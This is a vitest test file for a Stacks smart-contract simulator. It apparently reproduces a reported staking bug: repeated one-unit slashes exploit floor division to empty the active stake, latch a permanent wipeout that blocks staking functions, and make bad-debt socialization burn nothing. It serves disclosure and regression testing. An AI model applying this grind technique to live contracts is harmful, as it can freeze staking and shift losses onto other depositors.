import { beforeEach, describe, expect, it } from "vitest";
import { Cl } from "@stacks/transactions";
import {
  initialize_ir,
  set_allowed_contracts,
  set_asset_cap,
  deposit,
  mint_token,
  initialize_staking_reward,
  initialize_lp,
  initialize_staking,
  update_supported_collateral,
  add_collateral,
  borrow,
} from "./utils";
import {
  init_pyth,
  set_initial_price,
  set_price,
  set_pyth_time_delta,
  build_price_update,
} from "./pyth";

const accounts = simnet.getAccounts();
const user1 = accounts.get("wallet_1")!;
const user2 = accounts.get("wallet_2")!;
const borrower = accounts.get("wallet_3")!;
const harness = accounts.get("wallet_4")!;
const deployer = accounts.get("deployer")!;

const btc_collateral_contract = Cl.contractPrincipal(deployer, "mock-btc");

// The SDK returns a raw boolean for a bare bool read-only, not a ClarityValue
// wrapper. Read `.result` and compare with Cl.bool(...) like staking.test.ts does.
const readUint = (contract: string, fn: string, args: any[] = []) => {
  const res = simnet.callReadOnlyFn(contract, fn, args, deployer);
  return res.result.value;
};

const readBool = (contract: string, fn: string, args: any[] = []) => {
  const res = simnet.callReadOnlyFn(contract, fn, args, deployer);
  return res.result;
};

// Mirror the reporter's PoC: register a harness principal as an allowed
// contract, so it can drive slash-total-staked-lp-tokens and
// socialize-user-bad-debt exactly as liquidator-v1 does.
const allowHarness = () => {
  const res = simnet.callPublicFn(
    "state-v1",
    "set-allowed-contract",
    [Cl.standardPrincipal(harness)],
    deployer
  );
  expect(res.result).toBeOk(Cl.bool(true));
};

// Mirror default init: stake MINIMUM_INITIAL_STAKE = u1000 from the deployer and
// transfer the staked shares to NULL_ADDRESS, so A = 1000 dust is the only
// permanent active stake. The helper deposits the LP first so the internal
// stake transfer has a balance to move.
const initializeDefault = () => {
  initialize_staking(deployer, 1000n);
};

// Stake `total` LP tokens as user1, then initiate-unstake `queue` of them.
// With default init and total = queue = 1,000,000: A = 1000, W = 1,000,000.
const seedActiveAndQueue = (total: bigint, queue: bigint) => {
  mint_token("mock-usdc", Number(total), user1);
  deposit(Number(total), user1);

  let res = simnet.callPublicFn("staking-v1", "stake", [Cl.uint(total)], user1);
  expect(res.result).toBeOk(Cl.bool(true));

  res = simnet.callPublicFn("staking-v1", "initiate-unstake", [Cl.uint(queue)], user1);
  expect(res.result).toBeOk(Cl.uint(0));
};

// Grind the active bucket down by `slashes` one-unit slashes. Each slash of 1
// LP token against A=1000, W=1,000,000 floors the queue share to 0 and removes
// 1 from active, so 1000 slashes exhaust A while W is untouched.
const grind = (slashes: number) => {
  for (let i = 0; i < slashes; i++) {
    const res = simnet.callPublicFn(
      "staking-v1",
      "slash-total-staked-lp-tokens",
      [Cl.uint(1)],
      harness
    );
    expect(res.result).toBeOk(Cl.bool(true));
  }
};

describe("poc-97356 staking wipeout", () => {
  beforeEach(async () => {
    init_pyth(deployer);
    set_pyth_time_delta(7200, deployer);
    set_allowed_contracts(deployer);
    set_asset_cap(deployer, 10000000000000n);
    initialize_ir(deployer);
    initialize_staking_reward(deployer);
    initialize_lp(deployer);
    await set_initial_price("mock-usdc", 1n, deployer);
    await set_initial_price("mock-btc", 10n, deployer);
    allowHarness();
  });

  it("floor division exhausts active while the queue survives, the latch fires, and the three functions revert", () => {
    initializeDefault();
    seedActiveAndQueue(1_000_000n, 1_000_000n);

    // A = 1000 dust, W = 1,000,000, total = 1,001,000.
    expect(readUint("staking-v1", "get-active-staked-lp-tokens")).toBe(1000n);
    expect(readUint("staking-v1", "get-total-staked-lp-tokens")).toBe(1_001_000n);
    expect(readBool("staking-v1", "is-staking-wiped-out")).toStrictEqual(Cl.bool(false));

    // 1000 one-unit slashes: floor(1*W/(A+W)) = 0 each time, so each removes
    // 1 from active and 0 from the queue. After the grind A = 0, W = 1,000,000.
    grind(1000);

    expect(readBool("staking-v1", "is-staking-wiped-out")).toStrictEqual(Cl.bool(true));
    expect(readUint("staking-v1", "get-active-staked-lp-tokens")).toBe(0n);
    // The queue is untouched: total = 0 + 1,000,000.
    expect(readUint("staking-v1", "get-total-staked-lp-tokens")).toBe(1_000_000n);

    // The three functions that call check-staking-enabled revert forever.
    const stake = simnet.callPublicFn("staking-v1", "stake", [Cl.uint(1)], user2);
    expect(stake.result).toBeErr(Cl.uint(60010));

    const unstake = simnet.callPublicFn("staking-v1", "initiate-unstake", [Cl.uint(1)], user1);
    expect(unstake.result).toBeErr(Cl.uint(60010));

    const reconcile = simnet.callPublicFn("staking-v1", "reconcile-lp-token-balance", [], deployer);
    expect(reconcile.result).toBeErr(Cl.uint(60010));

    // The unbonding staker still finalizes and withdraws the full, unslashed queue.
    // finalization-at was set at unbond time + 100 blocks; the 1000 slash calls
    // have advanced the chain well past it.
    const finalize = simnet.callPublicFn("staking-v1", "finalize-unstake", [Cl.uint(0)], user1);
    expect(finalize.result).toBeOk(Cl.bool(true));

    const lpBalance = simnet.callReadOnlyFn(
      "state-v1",
      "get-balance",
      [Cl.standardPrincipal(user1)],
      deployer
    );
    expect(lpBalance.result.value.value).toBe(1_000_000n);
  });

  it("control: active survives the same grind one slash short of zero and the latch does not fire", () => {
    initializeDefault();
    seedActiveAndQueue(1_000_000n, 1_000_000n);

    // 999 slashes leave A = 1, W = 1,000,000. Active survives, so no latch.
    grind(999);

    expect(readBool("staking-v1", "is-staking-wiped-out")).toStrictEqual(Cl.bool(false));
    expect(readUint("staking-v1", "get-active-staked-lp-tokens")).toBe(1n);
    expect(readUint("staking-v1", "get-total-staked-lp-tokens")).toBe(1_000_001n);

    // With active surviving, staking still works: give user2 LP tokens and stake.
    mint_token("mock-usdc", 1000, user2);
    deposit(1000, user2);
    const stake = simnet.callPublicFn("staking-v1", "stake", [Cl.uint(1)], user2);
    expect(stake.result).toBeOk(Cl.bool(true));
  });

  it("after the latch, socialization reads the queue as empty and burns zero staked LP tokens", async () => {
    initializeDefault();
    seedActiveAndQueue(1_000_000n, 1_000_000n);

    // Fire the latch: A = 0, W = 1,000,000.
    grind(1000);
    expect(readBool("staking-v1", "is-staking-wiped-out")).toStrictEqual(Cl.bool(true));
    expect(readUint("staking-v1", "get-total-staked-lp-tokens")).toBe(1_000_000n);

    // Build a bad-debt position so a liquidation reaches socialization.
    mint_token("mock-usdc", 100_000_000_000, borrower);
    deposit(100_000_000_000, borrower);

    update_supported_collateral("mock-btc", 90000000, 95000000, 5000000, 8, deployer);
    mint_token("mock-btc", 100_000_000_000, borrower);
    add_collateral("mock-btc", 20_000_000_000, deployer, borrower);
    borrow(18_000_000_000, borrower);

    simnet.mineEmptyBlocks(500);

    await set_price("mock-usdc", 1n, deployer);
    await set_price("mock-btc", 1n, deployer);

    update_supported_collateral("mock-btc", 40000000, 50000000, 20000000, 8, deployer);

    mint_token("mock-usdc", 18_181_818_181, user2);
    simnet.mineEmptyBlocks(6);
    const res = simnet.callPublicFn(
      "liquidator-v1",
      "liquidate-collateral",
      [
        Cl.buffer(build_price_update()),
        btc_collateral_contract,
        Cl.principal(borrower),
        Cl.uint(18_181_818_181),
        Cl.uint(1),
      ],
      user2
    );
    expect(res.result).toBeOk(Cl.bool(true));

    const socializedEvent = res.events.find(
      (e: any) =>
        e.event === "print_event" &&
        e.data?.value?.value?.action?.value === "socialized-bad-debt"
    );
    expect(socializedEvent).toBeDefined();
    // effective-staked-lp-tokens is 0 because is-wiped is true, so the
    // socialization burns 0 staked LP tokens and leaves the 1,000,000 queue.
    expect(socializedEvent.data.value.value["burned-staking-lp-tokens"].value).toBe(0n);
    expect(readUint("staking-v1", "get-total-staked-lp-tokens")).toBe(1_000_000n);
  });
});
